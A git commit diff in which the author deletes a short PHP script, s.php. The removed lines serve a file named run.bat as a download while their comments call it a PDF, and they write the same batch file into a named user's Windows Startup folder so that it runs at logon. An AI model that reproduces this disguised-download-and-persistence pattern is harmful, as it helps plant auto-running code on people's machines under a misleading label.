32ffc82148e762b26d8da6313c02ee746430443a
fvargas1644 <113227292+fvargas1644@users.noreply.github.com>
2023-05-15 22:28:33 -0500

    Update s.php

--- s.php
+++ s.php
@@ -1,14 +1,1 @@
-<?php
 
-$file_url = 'run.bat'; // URL del archivo PDF que deseas descargar
-$file_name = 'run.bat'; // nombre que le darás al archivo PDF descargado
-$file_path = 'C:\Users\adelmo.vargas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\' . $file_name; // ruta donde se guardará el archivo PDF descargado
-
-
-header('Content-Type: application/octet-stream');
-header("Content-Transfer-Encoding: Binary");
-header("Content-disposition: attachment; filename=\"" . $file_name . "\"");
-readfile($file_url);
-file_put_contents($file_path, file_get_contents($file_url));
-
-?>
